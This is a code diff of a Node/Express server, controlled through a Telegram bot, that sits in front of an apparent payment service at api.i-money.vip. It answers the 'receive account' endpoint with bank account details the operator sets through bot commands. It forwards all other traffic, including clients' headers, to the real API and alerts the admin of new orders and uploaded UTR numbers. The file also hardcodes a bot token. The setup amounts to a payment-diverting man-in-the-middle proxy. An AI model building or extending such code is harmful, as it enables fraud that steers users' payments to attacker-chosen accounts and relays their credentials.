@@ -7,9 +7,8 @@ const kv = new Redis({
 });
 
 const app = express();
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
+const ORIGINAL_API = 'https://api.i-money.vip';
 const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
 const WEBHOOK_URL = 'https://ixcv.vercel.app/api/telegram';
 let bot;
@@ -25,7 +24,7 @@ async function ensureWebhook() {
     await bot.setWebHook(WEBHOOK_URL);
     webhookSet = true;
   } catch (e) {
-    console.error('Webhook setup error:', e.message);
+    console.error('Webhook error:', e.message);
   }
 }
 
@@ -33,8 +32,7 @@ const DEFAULT_DATA = {
   banks: [],
   activeIndex: -1,
   walletType: 'paytm',
-  adminChatId: null,
-  orders: {}
+  adminChatId: null
 };
 
 async function loadData() {
@@ -42,7 +40,6 @@ async function loadData() {
     let data = await kv.get('bankData');
     if (data) {
       if (typeof data === 'string') data = JSON.parse(data);
-      if (!data.orders) data.orders = {};
       return data;
     }
   } catch (e) {
@@ -59,7 +56,6 @@ async function saveData(data) {
   }
 }
 
-
 function getActiveBank(bankData) {
   if (bankData.activeIndex >= 0 && bankData.activeIndex < bankData.banks.length) {
     return bankData.banks[bankData.activeIndex];
@@ -74,6 +70,46 @@ function bankListText(bankData) {
     return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${active}`;
   }).join('\n');
 }
+
+async function proxyToOriginal(req, res) {
+  try {
+    const url = ORIGINAL_API + req.originalUrl;
+    const headers = { ...req.headers };
+    delete headers['host'];
+    delete headers['content-length'];
+    headers['host'] = 'api.i-money.vip';
+
+    const fetchOptions = {
+      method: req.method,
+      headers: headers
+    };
+
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.body) {
+      fetchOptions.body = JSON.stringify(req.body);
+      fetchOptions.headers['content-type'] = 'application/json';
+    }
+
+    const response = await fetch(url, fetchOptions);
+    const contentType = response.headers.get('content-type') || '';
+    
+    if (contentType.includes('json')) {
+      const data = await response.json();
+      res.status(response.status).json(data);
+      return data;
+    } else {
+      const text = await response.text();
+      res.status(response.status).send(text);
+      return null;
+    }
+  } catch (e) {
+    console.error('Proxy error:', e.message);
+    res.status(502).json({ code: 0, msg: 'Proxy error' });
+    return null;
+  }
+}
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
 app.get('/setup-webhook', async (req, res) => {
   if (!bot) return res.json({ error: 'No bot token' });
@@ -107,18 +143,14 @@ app.post('/api/telegram', async (req, res) => {
       bankData.adminChatId = chatId;
       await saveData(bankData);
       await bot.sendMessage(chatId,
-`🏦 IMoney Bank Controller Bot
+`🏦 IMoney Bank Controller
 
-Commands:
-/addbank <AccountNo> | <HolderName> | <IFSC>
+/addbank <AccNo> | <Name> | <IFSC>
 /removebank <number>
 /usebank <number>
-/setwallet <walletType>
 /deactivate
 /list
 /status
-/orders
-/help
 
 Example:
 /addbank 1234567890 | Rahul Kumar | SBIN0001234
@@ -127,156 +159,82 @@ Example:
     }
 
     else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
-      await bot.sendMessage(chatId, '❌ Unauthorized. Only admin can use this bot.');
+      await bot.sendMessage(chatId, '❌ Unauthorized.');
       return res.sendStatus(200);
-    }
-
-    else if (text === '/help') {
-      await bot.sendMessage(chatId,
-`Commands:
-
-/addbank <AccountNo> | <HolderName> | <IFSC>
-  Naya bank account add karo (max 10)
-
-/removebank <number>
-  Bank remove karo by number
-
-/usebank <number>
-  Active bank select karo
-
-/setwallet <type>
-  Wallet type: paytm, phonepe, freecharge, mobikwik, airtel, jio
-
-/deactivate — Sab deactivate karo
-/list — Saari banks dekho
-/status — Active bank dekho
-/orders — Recent orders dekho`
-      );
     }
 
     else if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length !== 3) {
-        await bot.sendMessage(chatId, '❌ Format: /addbank AccountNo | HolderName | IFSC');
+        await bot.sendMessage(chatId, '❌ Format: /addbank AccNo | Name | IFSC');
         return res.sendStatus(200);
       }
       if (bankData.banks.length >= 10) {
-        await bot.sendMessage(chatId, '❌ Maximum 10 banks. Pehle /removebank se koi hatao.');
+        await bot.sendMessage(chatId, '❌ Max 10 banks.');
         return res.sendStatus(200);
       }
       bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
-      bankData.adminChatId = chatId;
       if (bankData.banks.length === 1) bankData.activeIndex = 0;
       await saveData(bankData);
-      const idx = bankData.banks.length;
       await bot.sendMessage(chatId,
-`✅ Bank #${idx} added:
-Account: ${parts[0]}
-Holder: ${parts[1]}
-IFSC: ${parts[2]}
-${bankData.banks.length === 1 ? '(Auto-activated)' : `Use /usebank ${idx} to activate`}`
+`✅ Bank #${bankData.banks.length} added:
+${parts[0]} | ${parts[1]} | ${parts[2]}
+${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
       );
     }
 
     else if (text.startsWith('/removebank ')) {
       const num = parseInt(text.substring(12).trim());
       if (isNaN(num) || num < 1 || num > bankData.banks.length) {
-        await bot.sendMessage(chatId, `❌ Invalid. Use 1-${bankData.banks.length}. Check /list`);
+        await bot.sendMessage(chatId, '❌ Invalid number. /list se check karo.');
         return res.sendStatus(200);
       }
-      const idx = num - 1;
-      const removed = bankData.banks.splice(idx, 1)[0];
-      if (bankData.activeIndex === idx) {
-        bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
-      } else if (bankData.activeIndex > idx) {
-        bankData.activeIndex--;
-      }
-      bankData.adminChatId = chatId;
+      const removed = bankData.banks.splice(num - 1, 1)[0];
+      if (bankData.activeIndex === num - 1) bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
+      else if (bankData.activeIndex > num - 1) bankData.activeIndex--;
       await saveData(bankData);
-      await bot.sendMessage(chatId,
-`🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}
-${bankData.banks.length > 0 ? `Active: #${bankData.activeIndex + 1}` : 'No banks left.'}`
-      );
+      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
     }
 
     else if (text.startsWith('/usebank ')) {
       const num = parseInt(text.substring(9).trim());
       if (isNaN(num) || num < 1 || num > bankData.banks.length) {
-        await bot.sendMessage(chatId, `❌ Invalid. Use 1-${bankData.banks.length}. Check /list`);
+        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
         return res.sendStatus(200);
       }
       bankData.activeIndex = num - 1;
-      bankData.adminChatId = chatId;
       await saveData(bankData);
       const bank = bankData.banks[bankData.activeIndex];
       await bot.sendMessage(chatId,
-`✅ Bank #${num} ACTIVATED:
-Account: ${bank.accountNo}
-Holder: ${bank.accountHolder}
-IFSC: ${bank.ifsc}
-Wallet: ${bankData.walletType}`
+`✅ Bank #${num} ACTIVE:
+${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
       );
-    }
-
-    else if (text.startsWith('/setwallet ')) {
-      const type = text.substring(11).trim().toLowerCase();
-      const valid = ['paytm', 'phonepe', 'freecharge', 'mobikwik', 'airtel', 'jio'];
-      if (!valid.includes(type)) {
-        await bot.sendMessage(chatId, `❌ Invalid. Options: ${valid.join(', ')}`);
-        return res.sendStatus(200);
-      }
-      bankData.walletType = type;
-      bankData.adminChatId = chatId;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, `✅ Wallet type: ${type}`);
     }
 
     else if (text === '/deactivate') {
       bankData.activeIndex = -1;
-      bankData.adminChatId = chatId;
       await saveData(bankData);
-      await bot.sendMessage(chatId, '🔴 All banks DEACTIVATED.');
+      await bot.sendMessage(chatId, '🔴 All banks deactivated.');
     }
 
     else if (text === '/list') {
-      await bot.sendMessage(chatId, `🏦 Saved Banks:\n\n${bankListText(bankData)}\n\nWallet: ${bankData.walletType}`);
+      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}`);
     }
 
     else if (text === '/status') {
       const active = getActiveBank(bankData);
       if (!active) {
-        await bot.sendMessage(chatId, '🔴 No active bank. Use /usebank <number>');
+        await bot.sendMessage(chatId, '🔴 No active bank.');
         return res.sendStatus(200);
       }
       await bot.sendMessage(chatId,
-`🟢 Active Bank:
-Account: ${active.accountNo}
-Holder: ${active.accountHolder}
-IFSC: ${active.ifsc}
-Wallet: ${bankData.walletType}
-Total Banks: ${bankData.banks.length}`
+`🟢 Active: ${active.accountNo} | ${active.accountHolder} | ${active.ifsc}`
       );
-    }
-
-    else if (text === '/orders') {
-      const orderKeys = Object.keys(bankData.orders);
-      if (orderKeys.length === 0) {
-        await bot.sendMessage(chatId, 'No orders yet.');
-        return res.sendStatus(200);
-      }
-      const recent = orderKeys.slice(-10).reverse();
-      let t = '📋 Recent Orders:\n\n';
-      for (const key of recent) {
-        const o = bankData.orders[key];
-        const utr = o.utr ? `✅ UTR: ${o.utr}` : '⏳ UTR pending';
-        t += `${o.orderId} | ₹${o.amount} | ${utr}\n`;
-      }
-      await bot.sendMessage(chatId, t);
     }
 
     return res.sendStatus(200);
   } catch (err) {
-    console.error('Telegram handler error:', err);
+    console.error('Telegram error:', err);
     return res.sendStatus(200);
   }
 });
@@ -284,241 +242,86 @@ Total Banks: ${bankData.banks.length}`
 app.get('/wallet/online/walletType', async (req, res) => {
   const bankData = await loadData();
   const active = getActiveBank(bankData);
-  if (!active) {
-    return res.json({ code: 0, data: null, msg: 'No active wallet' });
+  if (active) {
+    return res.json({
+      code: 1,
+      data: {
+        receiveAccountNo: active.accountNo,
+        receiveAccountName: active.accountHolder,
+        receiveIfsc: active.ifsc,
+        walletType: bankData.walletType || 'paytm'
+      },
+      msg: 'success'
+    });
   }
-  res.json({
-    code: 1,
-    data: {
-      receiveAccountNo: active.accountNo,
-      receiveAccountName: active.accountHolder,
-      receiveIfsc: active.ifsc,
-      walletType: bankData.walletType
-    },
-    msg: 'success'
-  });
-});
-
-app.post('/money/orderId', async (req, res) => {
-  const bankData = await loadData();
-  const active = getActiveBank(bankData);
-  if (!active) return res.json({ code: 0, data: null, msg: 'Service unavailable' });
-
-  const orderId = 'RS' + Date.now() + Math.random().toString(36).substring(2, 6);
-  const amount = req.body.amount || '0';
-
-  bankData.orders[orderId] = {
-    orderId, amount, account: active.accountNo, holder: active.accountHolder,
-    ifsc: active.ifsc, walletType: bankData.walletType, status: 'pending',
-    utr: null, createdAt: new Date().toISOString()
-  };
-  await saveData(bankData);
-
-  if (bankData.adminChatId && bot) {
-    bot.sendMessage(bankData.adminChatId,
-`🔔 New Order!
-Order ID: ${orderId}
-Amount: ₹${amount}
-Wallet: ${bankData.walletType}
-Account: ${active.accountNo}
-Holder: ${active.accountHolder}
-IFSC: ${active.ifsc}`
-    ).catch(() => {});
-  }
-
-  res.json({
-    code: 1,
-    data: {
-      orderId, amount,
-      receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder,
-      receiveIfsc: active.ifsc, walletType: bankData.walletType, status: 'pending'
-    },
-    msg: 'success'
-  });
+  await proxyToOriginal(req, res);
 });
 
 app.post('/money/uploadUtr', async (req, res) => {
-  const { orderId, utr, utrAmount } = req.body;
   const bankData = await loadData();
-
-  if (orderId && bankData.orders[orderId]) {
-    bankData.orders[orderId].utr = utr;
-    bankData.orders[orderId].status = 'utr_uploaded';
-    await saveData(bankData);
-  }
-
   if (bankData.adminChatId && bot) {
+    const { orderId, utr, utrAmount } = req.body || {};
     bot.sendMessage(bankData.adminChatId,
 `💰 UTR Uploaded!
-Order ID: ${orderId || 'N/A'}
-UTR Number: ${utr || 'N/A'}
+Order: ${orderId || 'N/A'}
+UTR: ${utr || 'N/A'}
 Amount: ₹${utrAmount || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-
-  res.json({ code: 1, data: { orderId, utr, status: 'submitted' }, msg: 'UTR uploaded successfully' });
+  await proxyToOriginal(req, res);
 });
 
 app.post('/money/cancelUtr', async (req, res) => {
-  const { orderId } = req.body;
   const bankData = await loadData();
-
-  if (orderId && bankData.orders[orderId]) {
-    bankData.orders[orderId].status = 'utr_cancelled';
-    bankData.orders[orderId].utr = null;
-    await saveData(bankData);
-  }
-
   if (bankData.adminChatId && bot) {
     bot.sendMessage(bankData.adminChatId,
 `❌ UTR Cancelled!
-Order ID: ${orderId || 'N/A'}
+Order: ${req.body?.orderId || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-
-  res.json({ code: 1, data: null, msg: 'UTR cancelled' });
+  await proxyToOriginal(req, res);
 });
 
-app.post('/money/init/order', async (req, res) => {
+app.post('/money/orderId', async (req, res) => {
   const bankData = await loadData();
-  const active = getActiveBank(bankData);
-  if (!active) return res.json({ code: 0, data: null, msg: 'Service unavailable' });
-
-  const orderId = 'RS' + Date.now() + Math.random().toString(36).substring(2, 6);
-  const amount = req.body.amount || '0';
-
-  bankData.orders[orderId] = {
-    orderId, amount, account: active.accountNo, holder: active.accountHolder,
-    ifsc: active.ifsc, walletType: bankData.walletType, status: 'pending',
-    utr: null, createdAt: new Date().toISOString()
-  };
-  await saveData(bankData);
-
-  res.json({
-    code: 1,
-    data: {
-      orderId, amount,
-      receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder,
-      receiveIfsc: active.ifsc, walletType: bankData.walletType, status: 'pending'
-    },
-    msg: 'success'
-  });
+  if (bankData.adminChatId && bot) {
+    bot.sendMessage(bankData.adminChatId,
+`🔔 New Order!
+Amount: ₹${req.body?.amount || 'N/A'}
+Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+    ).catch(() => {});
+  }
+  await proxyToOriginal(req, res);
 });
 
 app.post('/money/create/v2', async (req, res) => {
   const bankData = await loadData();
-  const active = getActiveBank(bankData);
-  if (!active) return res.json({ code: 0, data: null, msg: 'Service unavailable' });
-
-  const orderId = 'RS' + Date.now() + Math.random().toString(36).substring(2, 6);
-  const amount = req.body.amount || '0';
-
-  bankData.orders[orderId] = {
-    orderId, amount, account: active.accountNo, holder: active.accountHolder,
-    ifsc: active.ifsc, walletType: bankData.walletType, status: 'pending',
-    utr: null, createdAt: new Date().toISOString()
-  };
-  await saveData(bankData);
-
   if (bankData.adminChatId && bot) {
     bot.sendMessage(bankData.adminChatId,
 `🔔 New Order (v2)!
-Order ID: ${orderId}
-Amount: ₹${amount}
-Account: ${active.accountNo}
-Holder: ${active.accountHolder}`
+Amount: ₹${req.body?.amount || 'N/A'}
+Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-
-  res.json({
-    code: 1,
-    data: {
-      orderId, amount,
-      receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder,
-      receiveIfsc: active.ifsc, walletType: bankData.walletType, status: 'pending'
-    },
-    msg: 'success'
-  });
+  await proxyToOriginal(req, res);
 });
-
-app.get('/money/order/list', (req, res) => {
-  res.json({ code: 1, data: [], msg: 'success' });
-});
-
-app.get('/money/list/v2', (req, res) => {
-  res.json({ code: 1, data: { list: [], total: 0 }, msg: 'success' });
-});
-
-app.post('/money/check/payStatus', async (req, res) => {
-  const { orderId } = req.body;
-  const bankData = await loadData();
-  const order = orderId ? bankData.orders[orderId] : null;
-  res.json({
-    code: 1,
-    data: { orderId: orderId || '', status: order ? order.status : 'pending', payStatus: 0 },
-    msg: 'success'
-  });
-});
-
-app.post('/money/returnOrder', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/money/returnOrder/check', (req, res) => res.json({ code: 1, data: { status: 0 }, msg: 'success' }));
-app.get('/banner', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
-app.get('/contact/info', (req, res) => res.json({ code: 1, data: { telegram: '', whatsapp: '', email: '' }, msg: 'success' }));
-app.get('/user/index', (req, res) => res.json({ code: 1, data: { balance: '0', totalRecharge: '0' }, msg: 'success' }));
-app.post('/user/check/paypwd', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.get('/user/checkPinStatus', (req, res) => res.json({ code: 1, data: { hasPinSet: true }, msg: 'success' }));
-app.get('/user/cashFlow', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
-app.get('/bank/list', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
-app.post('/bank/create', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/bank/update', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/bank/delete', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.get('/wallet/list', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
-app.post('/wallet/add', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/add/v2', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/connect', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/stop', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/deviceBuild', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/deviceCheck', (req, res) => res.json({ code: 1, data: { status: 1 }, msg: 'success' }));
-app.post('/wallet/sendDeviceOtp', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/deviceOtpVerify', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/sendOtp', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/wallet/directLogin', (req, res) => res.json({ code: 1, data: { token: 'session_' + Date.now() }, msg: 'success' }));
-app.post('/wallet/directLogin/v2', (req, res) => res.json({ code: 1, data: { token: 'session_' + Date.now() }, msg: 'success' }));
-app.post('/wallet/upload/video', (req, res) => res.json({ code: 1, data: null, msg: 'Upload successful' }));
-app.post('/login', (req, res) => res.json({ code: 1, data: { token: 'session_' + Date.now() }, msg: 'success' }));
-app.post('/smsCode', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/user/setLoginPwd', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/user/setPayPwd', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/user/forgetPass', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
-app.post('/user/setTelegram', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
 
 app.get('/health', async (req, res) => {
-  let dbStatus = 'ok';
-  let dbError = null;
-  try {
-    await kv.set('healthCheck', 'test');
-    const val = await kv.get('healthCheck');
-    if (val !== 'test') dbStatus = 'read_mismatch';
-  } catch (e) {
-    dbStatus = 'error';
-    dbError = e.message;
-  }
-
   const bankData = await loadData();
   const active = getActiveBank(bankData);
   res.json({
-    status: 'ok', database: dbStatus, dbError,
-    bankActive: !!active, totalBanks: bankData.banks.length,
-    walletType: bankData.walletType, totalOrders: Object.keys(bankData.orders).length,
+    status: 'ok',
+    mode: 'proxy',
+    bankActive: !!active,
+    totalBanks: bankData.banks.length,
     adminSet: !!bankData.adminChatId
   });
 });
 
-app.use((req, res) => {
-  console.log(`[CATCH-ALL] ${req.method} ${req.url}`);
-  res.json({ code: 1, data: null, msg: 'success' });
+app.use(async (req, res) => {
+  await proxyToOriginal(req, res);
 });
 
 module.exports = app;
